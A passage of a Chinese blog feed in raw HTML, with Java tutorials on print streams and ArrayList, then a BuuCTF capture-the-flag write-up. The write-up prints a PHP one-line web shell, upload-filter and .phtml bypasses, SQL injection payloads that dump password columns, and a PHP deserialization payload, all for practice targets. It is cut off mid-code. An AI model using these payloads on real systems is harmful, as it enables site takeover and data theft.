class="keyword">class</span> <span class="title class_">KryoParam</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KryoParam</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KryoParam&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h2><p><code>System.out.println()</code> 的使用频率恐怕不亚于 main 方法的使用频率。其中 <code>System.out</code> 返回的正是打印流 <code>PrintStream</code> 。<br>除此之外，还有它还有一个孪生兄弟，PrintWriter。PrintStream 是 OutputStream 的子类，PrintWriter 是 Writer 的子类，也就是说，一个<a href="https://javabetter.cn/io/stream.html">字节流</a>，一个是<a href="https://javabetter.cn/io/reader-writer.html">字符流</a>。</p><p>打印流具有以下几个特点：</p><ul><li>可以自动进行数据类型转换：打印流可以将各种数据类型转换为字符串，并输出到指定的输出流中。</li><li>可以自动进行换行操作：打印流可以在输出字符串的末尾自动添加换行符，方便输出多个字符串时的格式控制。</li><li>可以输出到控制台或者文件中：打印流可以将数据输出到控制台或者文件中，方便调试和日志记录（尽管生产环境下更推荐使用 <a href="https://javabetter.cn/gongju/logback.html">Logback</a>、ELK 等）。</li></ul><p>PrintStream 类的常用方法包括：</p><ul><li><code>print()</code>：输出一个对象的字符串表示形式。</li><li><code>println()</code>：输出一个对象的字符串表示形式，并在末尾添加一个换行符。</li><li><code>printf()</code>：使用指定的格式字符串和参数输出格式化的字符串。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintStream</span> <span class="variable">ps</span> <span class="operator">=</span> System.out;</span><br><span class="line">ps.println(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;沉 &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;默 &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;王 &quot;</span>);</span><br><span class="line">ps.print(<span class="string">&quot;二 &quot;</span>);</span><br><span class="line">ps.println();</span><br><span class="line"></span><br><span class="line">ps.printf(<span class="string">&quot;姓名：%s，年龄：%d，成绩：%f&quot;</span>, <span class="string">&quot;沉默王二&quot;</span>, <span class="number">18</span>, <span class="number">99.9</span>);</span><br></pre></td></tr></table></figure><p>在这个示例中，我们创建了一个 PrintStream 对象 ps，它输出到控制台。我们使用 ps 的 print 和 println 方法输出了一些字符串。</p><p>使用 printf 方法输出了一个格式化字符串，其中 %s、%d 和 %.2f 分别表示字符串、整数和浮点数的格式化输出。我们使用逗号分隔的参数列表指定了要输出的值。</p><p>来详细说说 printf 方法哈。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrintStream <span class="title function_">printf</span><span class="params">(String format, Object... args)</span>;</span><br></pre></td></tr></table></figure><p>其中，format 参数是格式化字符串，args 参数是要输出的参数列表。格式化字符串包含了普通字符和转换说明符。普通字符是指除了转换说明符之外的字符，它们在输出时直接输出。转换说明符是由百分号（%）和一个或多个字符组成的，用于指定输出的格式和数据类型。</p><p>下面是 Java 的常用转换说明符及对应的输出格式：</p><ul><li><code>%s</code>：输出一个字符串。</li><li><code>%d</code> 或 <code>%i</code>：输出一个十进制整数。</li><li><code>%x</code> 或 <code>%X</code>：输出一个十六进制整数，<code>%x</code> 输出小写字母，<code>%X</code> 输出大写字母。</li><li><code>%f</code> 或 <code>%F</code>：输出一个浮点数。</li><li><code>%e</code> 或 <code>%E</code>：输出一个科学计数法表示的浮点数，<code>%e</code> 输出小写字母 e，<code>%E</code> 输出大写字母 E。</li><li><code>%g</code> 或 <code>%G</code>：输出一个浮点数，自动选择 <code>%f</code> 或 <code>%e/%E</code> 格式输出。</li><li><code>%c</code>：输出一个字符。</li><li><code>%b</code>：输出一个布尔值。</li><li><code>%h</code>：输出一个哈希码（16进制）。</li><li><code>%n</code>：换行符。</li></ul><p>除了转换说明符之外，Java 的 printf 方法还支持一些修饰符，用于指定输出的宽度、精度、对齐方式等。</p><ul><li>宽度修饰符：用数字指定输出的最小宽度，如果输出的数据不足指定宽度，则在左侧或右侧填充空格或零。</li><li>精度修饰符：用点号（.）和数字指定浮点数或字符串的精度，对于浮点数，指定小数点后的位数，对于字符串，指定输出的字符数。</li><li>对齐修饰符：用减号（-）或零号（0）指定输出的对齐方式，减号表示左对齐，零号表示右对齐并填充零。</li></ul><p>下面是一些示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">System.out.printf(<span class="string">&quot;%5d\n&quot;</span>, num); <span class="comment">// 输出 &quot;  123&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-5d\n&quot;</span>, num); <span class="comment">// 输出 &quot;123  &quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%05d\n&quot;</span>, num); <span class="comment">// 输出 &quot;00123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span> Math.PI;</span><br><span class="line">System.out.printf(<span class="string">&quot;%10.2f\n&quot;</span>, pi); <span class="comment">// 输出 &quot;      3.14&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-10.4f\n&quot;</span>, pi); <span class="comment">// 输出 &quot;3.1416    &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;沉默王二&quot;</span>;</span><br><span class="line">System.out.printf(<span class="string">&quot;%10s\n&quot;</span>, name); <span class="comment">// 输出 &quot;     沉默王二&quot;</span></span><br><span class="line">System.out.printf(<span class="string">&quot;%-10s\n&quot;</span>, name); <span class="comment">// 输出 &quot;沉默王二     &quot;</span></span><br></pre></td></tr></table></figure><p>具体来说，</p><ul><li>我们使用 <code>%5d</code> 来指定输出的整数占据 5 个字符的宽度，不足部分在左侧填充空格。</li><li>使用 <code>%-5d</code> 来指定输出的整数占据 5 个字符的宽度，不足部分在右侧填充空格。</li><li>使用 <code>%05d</code> 来指定输出的整数占据 5 个字符的宽度，不足部分在左侧填充 0。</li><li>使用 <code>%10.2f</code> 来指定输出的浮点数占据 10 个字符的宽度，保留 2 位小数，不足部分在左侧填充空格。</li><li>使用 <code>%-10.4f</code> 来指定输出的浮点数占据 10 个字符的宽度，保留 4 位小数，不足部分在右侧填充空格。</li><li>使用 <code>%10s</code> 来指定输出的字符串占据 10 个字符的宽度，不足部分在左侧填充空格。</li><li>使用 <code>%-10s</code> 来指定输出的字符串占据 10 个字符的宽度，不足部分在右侧填充空格。</li></ul><p>接下来，我们给出一个 PrintWriter 的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">writer.println(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">writer.printf(<span class="string">&quot;他的年纪为 %d.\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure><p>首先，我们创建一个 PrintWriter 对象，它的构造函数接收一个 Writer 对象作为参数。在这里，我们使用 FileWriter 来创建一个输出文件流，并将其作为参数传递给 PrintWriter 的构造函数。然后，我们使用 PrintWriter 的 println 和 printf 方法来输出两行内容，其中 printf 方法可以接收格式化字符串。最后，我们调用 PrintWriter 的 close 方法来关闭输出流。</p><p>我们也可以不创建 FileWriter 对象，直接指定文件名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">pw.println(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">pw.printf(<span class="string">&quot;他的年纪为 %d.\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">pw.close();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】集合框架（容器）</title>
      <link href="/2024/10/25/code/javacollection/"/>
      <url>/2024/10/25/code/javacollection/</url>
      
        <content type="html"><![CDATA[<h2 id="ArrayList详解"><a href="#ArrayList详解" class="headerlink" title="ArrayList详解"></a>ArrayList详解</h2><p><a href="https://javabetter.cn/collection/arraylist.html">https://javabetter.cn/collection/arraylist.html</a><br>ArrayList 在数组的基础上实现了自动扩容，并且提供了比数组更丰富的预定义方法（各种增删改查），非常灵活。<code>ArrayList</code> 是 Java 中的一种可调整大小的数组实现，它属于 <code>java.util</code> 包下的 <code>List</code> 接口的实现类。<code>ArrayList</code> 提供了动态数组的功能，这意味着它能够根据需要增加和减少其大小。这对于在编程中需要经常修改数组大小的场景非常有用。</p><h3 id="ArrayList-的主要特性"><a href="#ArrayList-的主要特性" class="headerlink" title="ArrayList 的主要特性"></a>ArrayList 的主要特性</h3><ol><li><strong>动态扩展</strong>：默认情况下，<code>ArrayList</code> 在元素填满容量时会自动扩大约为原来的1.5倍。</li><li><strong>随机访问</strong>：<code>ArrayList</code> 支持快速随机访问，时间复杂度为 O(1)，因为它底层是通过数组实现的。</li><li><strong>插入删除成本高</strong>：由于是数组实现，插入和删除操作可能需要移动元素以保持元素的连续性，这使得平均插入和删除操作的时间复杂度为 O(n)。</li></ol><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><ul><li><code>add(E e)</code>：向 <code>ArrayList</code> 的末尾添加一个元素。</li><li><code>add(int index, E element)</code>：在指定位置插入一个元素。</li><li><code>remove(int index)</code>：移除指定位置的元素。</li><li><code>get(int index)</code>：返回指定位置上的元素。</li><li><code>set(int index, E element)</code>：将指定位置的元素替换为新元素。</li><li><code>size()</code>：返回 <code>ArrayList</code> 中的元素个数。</li><li><code>clear()</code>：移除所有元素，清空列表。</li><li><code>isEmpty()</code>：检查列表是否为空。</li></ul><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><p>下面是一些使用 <code>ArrayList</code> 的基本示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayListExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        list.add(<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;Python&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在第一个位置插入新元素</span></span><br><span class="line">        list.add(<span class="number">0</span>, <span class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Element at index 1: &quot;</span> + list.get(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移除元素</span></span><br><span class="line">        list.remove(<span class="string">&quot;Python&quot;</span>); <span class="comment">// 移除对象</span></span><br><span class="line">        list.remove(<span class="number">2</span>); <span class="comment">// 移除指定索引位置的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换元素</span></span><br><span class="line">        list.set(<span class="number">0</span>, <span class="string">&quot;HTML&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出所有元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Contents of list: &quot;</span> + list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 清空列表</span></span><br><span class="line">        list.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在算法中的使用"><a href="#在算法中的使用" class="headerlink" title="在算法中的使用"></a>在算法中的使用</h3><p><code>ArrayList</code> 在许多算法中都非常有用，尤其是在需要动态数组功能时。例如，在处理不定量数据输入、进行数据聚合操作或者在需要频繁访问元素而不太频繁地插入或删除时，<code>ArrayList</code> 是一个非常合适的选择。</p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】BuuCTF解题记录</title>
      <link href="/2024/10/25/WebSecurity/ctf/buuctf/"/>
      <url>/2024/10/25/WebSecurity/ctf/buuctf/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h2><p>这道题就是一个简单的文件上传考点，主要涉及的知识点：</p><ul><li>一句话木马：<code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></li><li>修改文件头绕过检测：’GIF89a’，解题时用了GIF的文件头</li><li>猜测文件上传目录；拼接upload访问上传的文件</li><li>修改文件后缀执行脚本：php后缀被限制了，使用html可以上传，但是html不会被作为脚本执行，服务器使用了apache，它默认是有一个phtml解析的，它的意思是说，如果你的文件是以phtml结尾的，它会把它当作php代码来执行，主要是application&#x2F;x-httpd-php能够将我们phtml加入到php文件解析的类型当中</li></ul><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>SQL注入，简单测试<br><code>?username=admin&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code> 万能密码失败，发现or被过滤<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2%23</code> 尝试叠写绕过<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,3%23</code> 修改payload继续猜解<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23</code> 接下来查表<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=&#39;b4bsql&#39;%23</code> 进一步查询列字段,查出三个列字段：id,username,password<br><code>?username=admin&amp;password=admin&#39; uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23</code> flag</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>常见的网站源码备份文件后缀:tar.gz，zip，rar，tar<br>常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp<br>访问 <a href="http://www.zip/">www.zip</a> 成功获取到网站源代码，分析源代码，在其中发现下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显要用到php反序列化漏洞了，之前整理的php有一个漏洞点：当成员属性数目大于实际数目时可绕过wakeup方法<br>使用php在线执行工具输出序列化后的数据：<a href="https://www.jyshare.com/compile/1/">https://www.jyshare.com/compile/1/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admine&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="variable">$select</span> = <span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"> <span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(@<span class="variable">$select</span>);   </span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$res</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>程序输出：<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:6:&quot;admine&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</code><br>我们将 2 改为 3 或者 比二大的数字,同时，我们要将口变为 %00 若果不写 在我们复制的时候就会减少 空格<br>最终payload：<code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>尝试简单地访问下常见备份文件，发现不行，接着用dirsearch扫描，发现：&#x2F;index.php.bak 存在，访问下载，修改后缀后查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题主要考察弱类型比较，&#x3D; &#x3D; 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a&#x3D;123和b&#x3D;123admin456进行&#x3D; &#x3D;比较时。则b只会截取前面的整数部分。即b转化成123。<br>直接用 参数?key&#x3D;123 就可以了</p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示了后台弱口令，直接admin&#x2F;12345登陆后台，审计后台发现有以下漏洞</p><p>任意文件下载：设计——自定义——导出主题——保存<br>最后是一串base64编码，解密后是&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;12.zip而且是文件的绝对路径，我们直接包含&#x2F;flag就可以了，base64加密一下成为L2ZsYWc&#x3D;<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image.png"></p><p>任意代码执行漏洞：设计——自定义——首页——编辑，选择php源代码<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-1.png"><br>保存时需要首先创建一个文件验证管理员权限<br>这里配合任意文件上传漏洞实现，设计——组件——素材库——上传素材:<code>../../../../../system/tmp/nkgq</code>,修改文件名称<br><img src="/2024/10/25/WebSecurity/ctf/buuctf/image-2.png"><br>奇怪了 我这边一直尝试不成功</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span 